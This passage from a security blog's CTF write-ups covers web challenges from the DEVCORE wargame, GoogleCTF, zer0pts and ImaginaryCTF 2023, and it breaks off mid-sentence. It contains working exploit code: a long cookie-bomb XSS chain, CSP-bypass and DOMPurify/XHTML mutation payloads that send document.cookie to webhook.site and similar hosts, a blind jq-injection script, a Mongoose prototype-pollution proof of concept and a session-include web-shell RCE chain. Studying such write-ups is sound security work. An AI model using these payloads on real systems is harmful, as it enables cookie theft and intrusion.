PATHINFO_EXTENSION); $filename = random_str(32).'.'.$ext; if (isset($_POST['rename'])) &#123; $filename = $_POST['rename']; &#125; if (isset($_POST['folder'])) &#123; $folder = $_POST['folder']; if (!file_exists(IMAGE_PATH.$folder)) &#123; mkdir(IMAGE_PATH.$folder); &#125; $filename = $folder.'/'.$filename; &#125; $filepath = IMAGE_PATH . $filename; move_uploaded_file($_FILES['file']['tmp_name'], $filepath); system(\"rsync_wrap \".escapeshellarg($filepath)); $id = base64_urlsafe_encode($filename); echo json_encode([ 'default' => '/image.php?id='.$id ]); &#125; else &#123; http_response_code(400); &#125; First, try to upload it to ../../../../../usr/share/nginx/frontend and see, and then I got the fifth flag: But when I tried it, I found that the file was not actually written, and I tried other paths, such as b8ck3nd, or I thought it might be written to /usr/share/nginx/frontend/third_party/vendor and then triggered the phar vulnerability mentioned earlier (which seems reasonable), but it couldn’t be written here either. Or write it into langs and switch languages to import files, but it couldn’t be written here either. After thinking for a while, I tried writing it to /tmp, which worked fine, so the answer was obvious. First, write a file /tmp/test1234.php, and then write /tmp/sess_abc. Because the session file content can be manipulated, you can fill in the desired lang and manipulate the value of $_SESSION[&#39;lang&#39;], and then use the include.php mentioned at the beginning to import the web shell you wrote, and you can get RCE. After RCE, you can execute /readflag in the root directory to read the flag. So I missed the second flag alone, and I completed all the others, but where is the last one? After getting the shell, I went inside and looked around a bit. I originally thought it might be in the nginx config, but I couldn’t find it no matter how I looked (even at the end, I didn’t find where the nginx config was). After about half an hour, the order of the appearance of the flags should be similar to the order of the difficulty of the solutions. Since the first flag is Path Traversal and the third flag is SQL injection, the second flag should appear between the two. So I suddenly had an idea and thought, “It can’t be…” Then go to http://web.ctf.devcore.tw/order.php?id=1&amp;sig[]=1 The second flag appeared in front of me like this: SummaryFinally, let’s review the problems encountered this time. The most serious problem is that the critical file was not found when reading the file, which caused the whole thing to get stuck later. In the future, when encountering vulnerabilities that can read local files, you should create a dictionary file yourself. Otherwise, you will have to google for a long time to find out which files can be read each time. I will write an article to summarize this later. The second issue is that I didn’t notice the second flag. Actually, when doing SQL injection, if all the data that should be obtained has been obtained, it should be visible. Therefore, in the future, remember to dump the entire database. Overall, I think it’s quite fun. Thanks to DEVCORE’s wargame, and finally, because the challenge time was extended a bit, I successfully obtained the challenger NFT issued by DEVCORE!","link":"/2021/12/01/en/hitcon2021-devcore-wargame-writeup/"},{"title":"GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 Writeup","text":"A while ago, I was busy traveling and didn’t have much time for CTFs. Even if I did participate, I was too lazy to write a writeup, so my last writeup was back in March. I felt it was a shame to break the streak, so I quickly wrote another one to make up for it. Regarding the three CTFs mentioned in the title, I only participated in GoogleCTF 2023. For the other two events, I only briefly looked at the challenges, so this post will only serve as a note on the challenges and their solutions. Keyword list: Inconsistent order of POST data parsing between Flask and PHP iframe CSP blocking certain script loads CSRF bypass using HEAD method Accessing parent origin using location.ancestorOrigins Changing iframe location doesn’t affect the src Angular CSP bypass gadget in recaptcha URL Restoring input using document.execCommand(&#39;undo&#39;); X-HTTP-Method-Override Differences between HTML and XHTML parsers GoogleCTF 2023Here is the complete official challenge content and solution: https://github.com/google/google-ctf/tree/master/2023 UNDER-CONSTRUCTION (466 solves)The core code for this challenge is as follows: @authorized.route('/signup', methods=['POST']) def signup_post(): raw_request = request.get_data() username = request.form.get('username') password = request.form.get('password') tier = models.Tier(request.form.get('tier')) if(tier == models.Tier.GOLD): flash('GOLD tier only allowed for the CEO') return redirect(url_for('authorized.signup')) if(len(username) > 15 or len(username) &lt; 4): flash('Username length must be between 4 and 15') return redirect(url_for('authorized.signup')) user = models.User.query.filter_by(username=username).first() if user: flash('Username address already exists') return redirect(url_for('authorized.signup')) new_user = models.User(username=username, password=generate_password_hash(password, method='sha256'), tier=tier.name) db.session.add(new_user) db.session.commit() requests.post(f\"http://&#123;PHP_HOST&#125;:1337/account_migrator.php\", headers=&#123;\"token\": TOKEN, \"content-type\": request.headers.get(\"content-type\")&#125;, data=raw_request) return redirect(url_for('authorized.login')) There is a registration feature that checks the parameters in the data. After the check, the request is forwarded to PHP. Our goal is to create a user with a tier of GOLD. The solution exploits the inconsistency in POST data parsing between PHP and Flask. If we pass a=1&amp;a=2, Flask will retrieve 1 (the first one) for the parameter a, while PHP will retrieve 2 (the last one). Therefore, by leveraging this inconsistency, we can create a legitimate user in Flask with the tier set to GOLD when forwarding the request to PHP: curl -X POST http:&#x2F;&#x2F;&lt;flask-challenge&gt;&#x2F;signup -d &quot;username&#x3D;username&amp;password&#x3D;password&amp;tier&#x3D;blue&amp;tier&#x3D;gold&quot; BIOHAZARD (14 solves)This challenge allows you to create a note, and the goal is to perform an XSS attack. During the rendering of the note, there is a prototype pollution vulnerability. The rendering process first sanitizes the input: goog.require('goog.dom'); goog.require('goog.dom.safe'); goog.require('goog.html.sanitizer.unsafe'); goog.require('goog.html.sanitizer.HtmlSanitizer.Builder'); goog.require('goog.string.Const'); window.addEventListener('DOMContentLoaded', () => &#123; var Const = goog.string.Const; var unsafe = goog.html.sanitizer.unsafe; var builder = new goog.html.sanitizer.HtmlSanitizer.Builder(); builder = unsafe.alsoAllowTags( Const.from('IFRAME is required for Youtube embed'), builder, ['IFRAME']); sanitizer = unsafe.alsoAllowAttributes( Const.from('iframe#src is required for Youtube embed'), builder, [ &#123; tagName: 'iframe', attributeName: 'src', policy: (s) => s.startsWith('https://') ? s : '', &#125; ]).build(); &#125;); setInnerHTML = function(elem, html) &#123; goog.dom.safe.setInnerHtml(elem, html); &#125; This sanitizer can be bypassed partially through prototype pollution. You cannot use new tags, but you can bypass attribute restrictions. For example, iframes are allowed, so you can use iframe srcdoc. There is a complication with the CSP: base-uri &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39; &#39;unsafe-eval&#39;; require-trusted-types-for &#39;script&#39;;. It includes trusted types, so even though you can inject &lt;img src=x onerror=alert(1)&gt;, the underlying sanitizer triggers a trusted types error when executing img.setAttribute(&#39;onerror&#39;,&#39;alert(1)&#39;), causing the attack to fail. I struggled for a while to bypass this restriction. Eventually, I had the idea that there are test HTML files under the static folder. If any of those files have an XSS vulnerability, we can simply use an iframe src to obtain the flag. I did some searching at the time but couldn’t find any suitable file. However, after the competition, I saw that someone did manage to solve it using this file: https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html Later, I realized that the way it loads JavaScript is like this: &lt;script src=\"/static/closure-library/closure/goog/base.js\" nonce=\"i8OeY0yF3xOOTZVZHHBqIg==\">&lt;/script> &lt;script src=\"/static/bootstrap.js\" nonce=\"i8OeY0yF3xOOTZVZHHBqIg==\">&lt;/script> &lt;script src=\"/static/sanitizer.js\" nonce=\"i8OeY0yF3xOOTZVZHHBqIg==\">&lt;/script> &lt;script src=\"/static/main.js\" nonce=\"i8OeY0yF3xOOTZVZHHBqIg==\">&lt;/script> There is a variable called editor defined in bootstrap.js, which is then loaded as a script src in main.js. If we block the loading of bootstrap.js using iframe csp and then combine it with polluting Object.prototype.editor, we can load any JS. And this is indeed the intended solution. I learned this trick in the Intigriti’s November XSS challenge, where CSP was tightened to prevent the loading of certain scripts. VEGGIE SODA (13 solves)During the competition, one of my teammates solved this completely without my help. After the competition, I looked at the official solution. The first level bypasses CSRF protection using HEAD, which seems to be a commonly used technique. The second level looks similar to last year’s HORKOS, involving JS deserialization vulnerability. Once a gadget chain is found, XSS can be achieved. Here is the link to the official solution: https://github.com/google/google-ctf/tree/master/2023/web-vegsoda POSTVIEWER V2 (7 solves)This challenge is the reason why I kept avoiding writing a writeup. It’s like the movie Inception, with layer upon layer, so complex that I didn’t even know what I was doing towards the end. Although it’s called V2, it’s quite different from last year’s challenge. Let’s focus on this part: async function previewIframe(body, mimeType, shimUrl, container, sandbox = ['allow-scripts']) &#123; const url = new URL(shimUrl); url.host = `sbx-$&#123;generateRandomPart()&#125;.$&#123;url.host&#125;`; url.searchParams.set('o', window.origin); var iframe = document.createElement('iframe'); iframe.src = url; container.appendChild(iframe); iframe.addEventListener('load', () => &#123; iframe.contentWindow?.postMessage(&#123; body, mimeType, sandbox&#125;, url.origin); &#125;, &#123; once: true &#125;); &#125; Here, a random sbx domain iframe is added, and the flag is passed through postMessage. The content of this sbx domain is also simple: const TRUSTED_ORIGIN = new URL(location.href).searchParams.get('o'); if(!/^https?:\\/\\//.test(TRUSTED_ORIGIN)) &#123; throw new Error(\"Untrusted Origin\"); &#125;else&#123; const DEFAULT_STYLE = 'position:absolute; top:0; left:0; bottom:0; right:0; width:100vw; height:100vh; border:none; margin:0; padding:0; z-index:999999;' window.onmessage = (e) => &#123; const forbidden_sbx = /allow-same-origin/ig; if(e.origin !== TRUSTED_ORIGIN)&#123; throw new Error(\"Wrong origin\"); &#125; if (e.data.body === undefined || !e.data.mimeType) &#123; throw new Error(\"No content to render\"); &#125;; const blob = new Blob([e.data.body], &#123; type: e.data.mimeType &#125;); const iframe = document.createElement('iframe'); iframe.style.cssText = DEFAULT_STYLE; document.body.appendChild(iframe); iframe.setAttribute('sandbox', ''); if(e.data.sandbox)&#123; for(const value of e.data.sandbox)&#123; if(forbidden_sbx.test(value) || !iframe.sandbox.supports(value))&#123; console.error(`Unsupported value: $&#123;value&#125;`); continue; &#125; iframe.sandbox.add(value); &#125; &#125; iframe.src = URL.createObjectURL(blob); document.body.appendChild(iframe); window.onmessage = null; e.source.postMessage('blob loaded', e.origin); &#125;; &#125; The received content is turned into a blob and then placed in a sandbox iframe. Our goal is to steal the content inside this iframe. There are a few troublesome points: The admin bot has restrictions. We cannot open new windows, and any functionality similar to window.open is not allowed. The CSP of the main domain is: frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; frame-src *.postviewer2-web.2023.ctfcompetition.com The CSP of the sbx domain is: frame-src blob: Firstly, we can easily obtain XSS on any sbx domain, like this: iframe = document.createElement(\"iframe\") url = new URL(\"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html\"); url.searchParams.set('o', window.origin); iframe.src = url iframe.addEventListener('load', () => &#123; iframe.contentWindow.postMessage(&#123;body:\"&lt;script>alert(document.domain)&lt;/script>\", mimeType: \"text/html\", sandbox: [\"allow-modals\",\"allow-scripts\",[\"allow-same-origin\"],[\"allow-same-origin\"]]&#125;, \"*\") &#125;, &#123; once: true &#125;); document.body.appendChild(iframe); Now, the question is, what can we do next? Our first step should be finding a way to bring the main domain into an iframe to perform further operations. However, the sbx domain only allows embedding pages starting with blob:, so how do we proceed? At this point, we thought of using a cookie bomb to make the sbx domain return HTTP/2 413 Request Entity Too Large, which would remove the CSP error page. The process is as follows: Load our own webpage first. Embed an sbx iframe to obtain XSS. Write a cookie from the sbx iframe to prevent loading of the &#x2F;bomb path. Add another iframe with &#x2F;bomb, which has no CSP. From the iframe in step 2, directly modify the content of the iframe in step 4 to obtain an XSS without CSP. Now we can embed the main domain inside the iframe. Steps 1 to 5 are correct, but step 6 is incorrect. Although there is no longer the restriction of frame-src blob:, the frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; of the main domain refers to all parent pages. So, as long as our top-level page is our own, we cannot bypass the CSP. Then I suddenly thought of using a blob, like this: const blob = new Blob(['&lt;h1>hello&lt;/h1>&lt;iframe src=\"http://127.0.0.1:5000/test\">&lt;/iframe>'], &#123; type: 'text/html' &#125;); url = URL.createObjectURL(blob) console.log(url) location = url This way, the top-level domain becomes sbx-xxx.postviewer2-web.2023.ctfcompetition.com, which satisfies the CSP. However, an error occurred during the attempt: Unsafe attempt to initiate navigation for frame with origin ‘http://localhost:3000/‘ from frame with URL ‘blob:https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818‘. The frame attempting to navigate the top-level window is cross-origin and either it or one of its ancestors is not allowed to navigate the top frame. Later, my teammate found that adding the sandbox attribute to the iframe resolved the issue: frame.sandbox = &#39;allow-modals allow-scripts allow-top-navigation allow-same-origin&#39;. This behavior is worth recording because I thought that not having the sandbox attribute would provide more permissions, but it turns out that adding the sandbox attribute is necessary. So the updated process is as follows: Load our own webpage first. Embed an sbx iframe (f1) to obtain XSS. Write a cookie from frame1 to prevent loading the &#x2F;bomb path. Add another iframe for &#x2F;bomb (f2) without CSP. Add another iframe (f3) for executing operations. Modify the HTML of f2 from f3, where the script written will add a blob HTML and then change the top.location. Successfully load the blob without any CSP. Load the main domain iframe on the blob page. At this point, the exploit has already reached 100 lines and is extremely complex: &lt;body>&lt;/body> &lt;script> const sleep = ms => new Promise(r => setTimeout(r, ms)) function createBombFrame() &#123; let bombFrame = document.createElement(\"iframe\") url = new URL(\"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html\"); url.searchParams.set('o', window.origin); bombFrame.src = url bombFrame.addEventListener('load', () => &#123; console.log('bombFrame created') bombFrame.contentWindow.postMessage(&#123; body: ` &lt;script> const domain = document.domain const cookieCount = 10 const cookieLength = 3000 const expireAfterMinute = 5 setCookieBomb() function setCookie(key, value) &#123; const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000); const v = key + '=' + value + '; path=/bomb; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString() parent.document.cookie = v &#125; function setCookieBomb() &#123; const value = 'Boring' + '_'.repeat(cookieLength) for (let i=0; i&lt;cookieCount; i++) &#123; setCookie('key' + i, value); &#125; &#125; &lt;\\/script>`, mimeType: \"text/html\", sandbox: [\"allow-modals\", \"allow-scripts\", [\"allow-same-origin\"], [\"allow-same-origin\"]] &#125;, \"*\") &#125;, &#123; once: true &#125;); document.body.appendChild(bombFrame) &#125; function createBrokenFrame() &#123; return new Promise(resolve => &#123; let brokenFrame = document.createElement(\"iframe\") url = 'https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/bomb' brokenFrame.src = url brokenFrame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin' brokenFrame.addEventListener('load', () => &#123; console.log('brokenFrame loaded') resolve() &#125;, &#123; once: true &#125;); brokenFrame.addEventListener('error', (e) => &#123; console.log('brokenFrame error', e) resolve() &#125;, &#123; once: true &#125;); document.body.appendChild(brokenFrame) &#125;) &#125; function createXssFrame() &#123; console.log('createXssFrame') window.xssFrame = document.createElement(\"iframe\") url = new URL(\"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html\"); url.searchParams.set('o', window.origin); xssFrame.src = url xssFrame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin' xssFrame.name = ` const blob = new Blob(['&lt;html>&lt;head>&lt;script src=\"YOUR PAYLOAD HERE\" />&lt;script>alert(1)&lt;/scr' + 'ipt>&lt;/head>&lt;body>&lt;div />&lt;/body>&lt;/html>'], &#123; type: 'text/html' &#125;); url = URL.createObjectURL(blob) console.log(url) window.top.location = url `; xssFrame.addEventListener('load', () => &#123; console.log('xss frame loaded') window.xssFrame.contentWindow.postMessage(&#123; body: ` &lt;script> top.frames[1].document.open() console.log('writing'); console.log('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>'); top.frames[1].document.write('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>') &lt;\\/script>`, mimeType: \"text/html\", sandbox: [\"allow-modals\", \"allow-scripts\", \"allow-top-navigation\", [\"allow-same-origin\"], [\"allow-same-origin\"]] &#125;, \"*\") &#125;, &#123; once: true &#125;); document.body.appendChild(xssFrame) &#125; async function main() &#123; createBombFrame() console.log(\"sleeping\") await sleep(2000) console.log(\"creating broken frame\") await createBrokenFrame() createXssFrame() &#125; window.addEventListener('message', e => &#123; console.log('got message', e, window.location.toString()); &#125;) window.addEventListener('load', () => &#123; main(); &#125;) &lt;/script> The main purpose of doing all these steps is just to load the main domain as an iframe, that’s it. However, we encountered a roadblock and couldn’t bypass this part: async function previewIframe(body, mimeType, shimUrl, container, sandbox = ['allow-scripts']) &#123; const url = new URL(shimUrl); url.host = `sbx-$&#123;generateRandomPart()&#125;.$&#123;url.host&#125;`; url.searchParams.set('o', window.origin); var iframe = document.createElement('iframe'); iframe.src = url; container.appendChild(iframe); iframe.addEventListener('load', () => &#123; iframe.contentWindow?.postMessage(&#123; body, mimeType, sandbox&#125;, url.origin); &#125;, &#123; once: true &#125;); &#125; We don’t know what the random domain is, so we can’t use postMessage as it will be blocked. It would be easier if we knew the random domain. We searched through various specifications, looked at Chromium source code and bug tracker, but made little progress. The closest we found was this: Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank, which is what we needed, but it has already been fixed. Just ten minutes before the end of the competition, my teammate found the location.ancestorOrigins property, and I realized that the child iframe can access the ancestor’s origin, which I had never noticed before (even though it’s the first property of the location object…). Due to time constraints, we couldn’t complete it in the end, only a few steps were left. The next step is to redirect the iframe with the flag to our prepared blob page, which can leak the sandbox domain using location.ancestorOrigins: top[0][0][0].location = URL.createObjectURL(new Blob(['&lt;script>top.postMessage(location.ancestorOrigins[0],\"*\")&lt;\\/script>'], &#123; type: 'text/html' &#125;)); Once we have the sandbox domain, we can obtain XSS on this domain. After obtaining XSS, we can access the sandbox domain. Although the location of the iframe has changed, the src of the iframe remains the same, so we can directly access the blob src with the flag. After that, we just need to fetch it to obtain the flag. fetch(top[0][0].document.querySelector('iframe').src) It could have been done in just a few hours initially, what a pity. Here is the author’s exploit, worth learning: https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html NOTENINJA (3 solves)Basically, you can insert any HTML in this challenge, but the key point is the CSP: script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; Initially, I thought this challenge used Next.js and would be similar to the approach used in corCTF 2022. However, I tried for a long time but couldn’t figure it out. Only after the competition did I realize that this challenge was just about finding the CSP gadget for recaptcha… Inside the recaptcha website, there is an Angular that can be used as a gadget. So the final solution is: ++++++++++++++++++++++++++++++++++++++ &lt;div ng-controller=\"CarouselController as c\" ng-init=\"c.init()\" > &amp;#91[c.element.ownerDocument.defaultView.parent.location=\"http://google.com?\"+c.element.ownerDocument.cookie]] &lt;div carousel>&lt;div slides>&lt;/div>&lt;/div> &lt;script src=\"https://www.google.com/recaptcha/about/js/main.min.js\">&lt;/script> ++++++++++++++++++++++++++++++++++++++ It’s also a less-known CSP bypass that I learned. Also, another team found a Mongoose 0day vulnerability: Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose The reason is in this line of code: https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74 await Note.findByIdAndUpdate(id, &#123; ...req.body, htmlDescription: htmlDescription &#125;); It directly takes in the entire body, and then you can create a prototype pollution through $rename: import &#123; connect, model, Schema &#125; from 'mongoose'; await connect('mongodb://127.0.0.1:27017/exploit'); const Example = model('Example', new Schema(&#123; hello: String &#125;)); const example = await new Example(&#123; hello: 'world!' &#125;).save(); await Example.findByIdAndUpdate(example._id, &#123; $rename: &#123; hello: '__proto__.polluted' &#125; &#125;); // this is what causes the pollution await Example.find(); const test = &#123;&#125;; console.log(test.polluted); // world! console.log(Object.prototype); // [Object: null prototype] &#123; polluted: 'world!' &#125; process.exit(); With this prototype pollution vulnerability, you can use find() to dump all the data and see other people’s notes. zer0ptsCTF 2023Let me provide a few references first: zer0pts CTF writeup (in English) zer0pts CTF 2023 writeup (4 web challs) zer0pts CTF 2023 Writeups The complete code for each challenge is available here: https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web Warmuprofile (48 solves)This challenge is quite interesting. You can add and delete users, and the goal is to create an admin user. However, the admin user already exists, so you need to find a way to delete it. The code for deletion is as follows: app.post('/user/:username/delete', needAuth, async (req, res) => &#123; const &#123; username &#125; = req.params; const &#123; username: loggedInUsername &#125; = req.session; if (loggedInUsername !== 'admin' &amp;&amp; loggedInUsername !== username) &#123; flash(req, 'general user can only delete itself'); return res.redirect('/'); &#125; // find user to be deleted const user = await User.findOne(&#123; where: &#123; username &#125; &#125;); await User.destroy(&#123; where: &#123; ...user?.dataValues &#125; &#125;); // user is deleted, so session should be logged out req.session.destroy(); return res.redirect('/'); &#125;); If you look closely and think about it, you will notice a problem here. The problem is that if you log in with two tabs at the same time, both sessions will have a username. Then, if you delete a user on one page and perform the same operation on the other page after deletion, User.findOne will return null because the user no longer exists in the database. When it reaches User.destroy, it becomes where: &#123;&#125;, which deletes everything in the database, including the admin. jqi (40 solves)In this challenge, you can execute corresponding jq commands based on the conditions you set. It was through this challenge that I discovered the many functionalities of jq. The main code is this part: const KEYS = ['name', 'tags', 'author', 'flag']; fastify.get('/api/search', async (request, reply) => &#123; const keys = 'keys' in request.query ? request.query.keys.toString().split(',') : KEYS; const conds = 'conds' in request.query ? request.query.conds.toString().split(',') : []; if (keys.length > 10 || conds.length > 10) &#123; return reply.send(&#123; error: 'invalid key or cond' &#125;); &#125; // build query for selecting keys for (const key of keys) &#123; if (!KEYS.includes(key)) &#123; return reply.send(&#123; error: 'invalid key' &#125;); &#125; &#125; const keysQuery = keys.map(key => &#123; return `$&#123;key&#125;:.$&#123;key&#125;` &#125;).join(','); // build query for filtering results let condsQuery = ''; for (const cond of conds) &#123; const [str, key] = cond.split(' in '); if (!KEYS.includes(key)) &#123; return reply.send(&#123; error: 'invalid key' &#125;); &#125; // check if the query is trying to break string literal if (str.includes('\"') || str.includes('\\\\(')) &#123; return reply.send(&#123; error: 'hacking attempt detected' &#125;); &#125; condsQuery += `| select(.$&#123;key&#125; | contains(\"$&#123;str&#125;\"))`; &#125; let query = `[.challenges[] $&#123;condsQuery&#125; | &#123;$&#123;keysQuery&#125;&#125;]`; console.log('[+] keys:', keys); console.log('[+] conds:', conds); console.log(query) let result; try &#123; result = await jq.run(query, './data.json', &#123; output: 'json' &#125;); &#125; catch(e) &#123; console.log(e) return reply.send(&#123; error: 'something wrong' &#125;); &#125; if (conds.length > 0) &#123; reply.send(&#123; error: 'sorry, you cannot use filters in demo version' &#125;); &#125; else &#123; reply.send(result); &#125; &#125;); Although double quotation marks are blocked, the backslash \\ is not blocked. Therefore, by combining two conditions, you can insert your own jq command and achieve command injection. You can retrieve the flag using env.FLAG. However, the problem is that the result is not returned, so it is a blind injection. You need to leak one character at a time. Below is the exploit from the zer0pts CTF 2023 writeup (4 web challs): import httpx import string # BASE_URL = \"http://localhost:8300\" BASE_URL = \"http://jqi.2023.zer0pts.com:8300\" CHARS = \"&#125;_\" + string.ascii_letters + string.digits def make_str(xs: str) -> str: return \"(\" + \"+\".join([f\"([&#123;ord(x)&#125;] | implode)\" for x in xs]) + \")\" def is_ok(prefix: str) -> bool: res = httpx.get( f\"&#123;BASE_URL&#125;/api/search\", params=&#123; \"keys\": \"name\", \"conds\": \",\".join([ \"\\\\ in name\", f\"))] + [if (env.FLAG | startswith(&#123;make_str(prefix)&#125;)) then error(&#123;make_str('x')&#125;) else 0 end] # in name\" ]), &#125;, ) return res.json()[\"error\"] == \"something wrong\" known = \"zer0pts&#123;\" while not known.endswith(\"&#125;\"): for c in CHARS: if is_ok(known + c): known += c break print(known) print(\"Flag: \" + known) Neko Note (26 solves)This is another classic note app. The core code is as follows: var linkPattern = regexp.MustCompile(`\\[([0-9a-f]&#123;8&#125;-[0-9a-f]&#123;4&#125;-4[0-9a-f]&#123;3&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;12&#125;)\\]`) // replace [(note ID)] to links func replaceLinks(note string) string &#123; return linkPattern.ReplaceAllStringFunc(note, func(s string) string &#123; id := strings.Trim(s, \"[]\") note, ok := notes[id] if !ok &#123; return s &#125; title := html.EscapeString(note.Title) return fmt.Sprintf( \"&lt;a href=/note/%s title=%s>%s&lt;/a>\", id, title, title, ) &#125;) &#125; // escape note to prevent XSS first, then replace newlines to &lt;br> and render links func renderNote(note string) string &#123; note = html.EscapeString(note) note = strings.ReplaceAll(note, \"\\n\", \"&lt;br>\") note = replaceLinks(note) return note &#125; After sanitization, the link will be replaced. Although there is also escaping here, because the attribute is not enclosed in quotes, arbitrary attributes can be injected into the a tag. Here, triggering XSS seems possible with onanimationend or onfocus. After triggering XSS, there is another step, which is that the stolen information is deleted. However, you can use the magical document.execCommand(&#39;undo&#39;); to restore it. ScoreShare (16 solves)The core code for this challenge is as follows: @app.route(\"/\", methods=['GET', 'POST']) def upload(): if flask.request.method == 'POST': title = flask.request.form.get('title', '') abc = flask.request.form.get('abc', None) link = flask.request.form.get('link', '') if not title: flask.flash('Title is empty') elif not abc: flask.flash('ABC notation is empty') else: sid = os.urandom(16).hex() db().hset(sid, 'title', title) db().hset(sid, 'abc', abc) db().hset(sid, 'link', link) return flask.redirect(flask.url_for('score', sid=sid)) return flask.render_template(\"upload.html\") @app.route(\"/score/&lt;sid>\") def score(sid: str): \"\"\"Score viewer\"\"\" title = db().hget(sid, 'title') link = db().hget(sid, 'link') if link is None: flask.flash(\"Score not found\") return flask.redirect(flask.url_for('upload')) return flask.render_template(\"score.html\", sid=sid, link=link.decode(), title=title.decode()) @app.route(\"/api/score/&lt;sid>\") def api_score(sid: str): abc = db().hget(sid, 'abc') if abc is None: return flask.abort(404) else: return flask.Response(abc) You can add a post or something similar, and there is an unintended endpoint /api/score/&lt;sid&gt; that directly outputs the entire abc. So, by adding two posts, one with JS content and the other with &lt;script src=...&gt;, you can directly perform XSS. The expected solution can be found in the author’s article: zer0pts CTF 2023 Writeup. By using iframe DOM clobbering and combining it with the existing functionality, prototype pollution can be achieved, and then the gadget for ABCJS can be found. Ringtone (14 solves)This challenge is a bit complicated, so I’ll briefly summarize it. You can obtain an XSS in the Chrome extension context through DOM clobbering. Then, using chrome.history.search, you can retrieve the flag URL and obtain the flag. Author’s writeup: Ringtone Web Challenge Writeup - Zer0pts CTF 2023 Plain Blog (14 solves)This challenge is a blog app. You need permission to retrieve the flag, and to have this permission, your post must have more than 1_000_000_000_000 likes. However, it is clear that the website blocks the maximum number of likes, so it is impossible to reach such a high number. The solution lies in a frontend prototype pollution vulnerability. By exploiting this vulnerability, you can contaminate the parameters of the fetch request and include the X-HTTP-Method-Override: PUT header, allowing the admin bot to directly call another API and obtain the permission. ImaginaryCTF 2023Sanitized (5 solves)The code for this challenge is quite short, and one thing worth noting is that the CSP is set to default-src &#39;self&#39;. Additionally, there is a path in Express: app.use((req, res) => &#123; res.type('text').send(`Page $&#123;req.path&#125; not found`) &#125;) It can be seen that the response from this path needs to be used as a script to execute. On the frontend side, it is a classic call to DOMPurify: const params = new URLSearchParams(location.search) const html = params.get('html') if (html) &#123; document.getElementById('html').value = html document.getElementById('display').innerHTML = DOMPurify.sanitize(html) &#125; When loading main.js in index.xhtml, it uses a relative path: &lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;. Let’s first look at the unintended solution, which is quite interesting. The unintended solution is to make the bot load this path: /1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//asd%2f..%2f..%2findex.xhtml#https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750? This exploits RPO (Relative Path Overwrite) to cause mischief. For the backend, %2f is interpreted as /, so this URL loads index.xhtml without any issues. However, for the browser, the current path becomes 1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//, so it will load /1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js. According to Express’s route, the response will be: Page &#x2F;1;var[Page]&#x3D;[1];location&#x3D;location.hash.slice(1)+document.cookie&#x2F;&#x2F;main.js not found The first line Page /1 does not throw a “variable is not defined” error because of the hoisting of var [Page]=[1], and the last line main.js not found is turned into a comment by the preceding //, so the middle part is executed, and the cookie is stolen. This operation is really cool. Sanitized Revenge (3 solves)This question fixes the unintended behavior, so let’s take a look at the expected solution. First and foremost, the important point of this question is that the webpage is xhtml, not html, so the browser’s parsing behavior will be different. For example, the payload provided by the author: &lt;div>&lt;div id=\"url\">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?&lt;/div>&lt;style>&lt;![CDATA[&lt;/style>&lt;div data-x=\"]]＞&lt;/style>&lt;iframe name='Page' />&lt;base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' />&lt;style>&lt;!--\">&lt;/div>&lt;style>-->&lt;/style>&lt;/div> will be parsed by the HTML parser as a style tag + a div with the data-x attribute, so DOMPurify won’t do anything, and this is valid HTML. But because we are in xhtml, the CDATA part becomes something that looks like a comment, so after removing it, it becomes: &lt;div> &lt;div id=\"url\">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?&lt;/div> &lt;style>&lt;/style> &lt;iframe name='Page' />&lt;base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' />&lt;style>&lt;!--\">&lt;/div>&lt;style>-->&lt;/style>&lt;/div> The iframe and base that were originally inside the attribute come out. We need the base because when we encounter CSP like script-src &#39;self&#39;, the first instinct is to use &lt;iframe srcdoc&gt; with a script gadget to bypass it. However, in this question, due to the limitation of xhtml, &lt; cannot be present in attributes, so we need to use the upcoming report.js together with base to change the path. In the author’s writeup, there are several other solutions given, each of which is quite interesting. The first one takes advantage of the fact that HTML ignores &lt;!-- inside style tags, but xhtml doesn’t, to create a difference: &lt;body> &lt;style>a &#123; color: &lt;!--&#125;&lt;/style> &lt;img alt=\"-->&lt;/style>&lt;base href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/cb6c5dql.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//x/' />\"> &lt;/body> The second one exploits the fact that DOMPurify checks for valid HTML tags when detecting mXSS, which need to be ASCII alphanumeric, but XML actually allows more characters: a&lt;style>&lt;ø:base id=\"giotino\" xmlns:ø=\"http://www.w3.org/1999/xhtml\" href=\"/**/=1;alert(document.cookie);//\" />&lt;/style> So it’s fine in an HTML context, but in xhtml, it will still be parsed as a base tag. The third one looks similar to the first one, 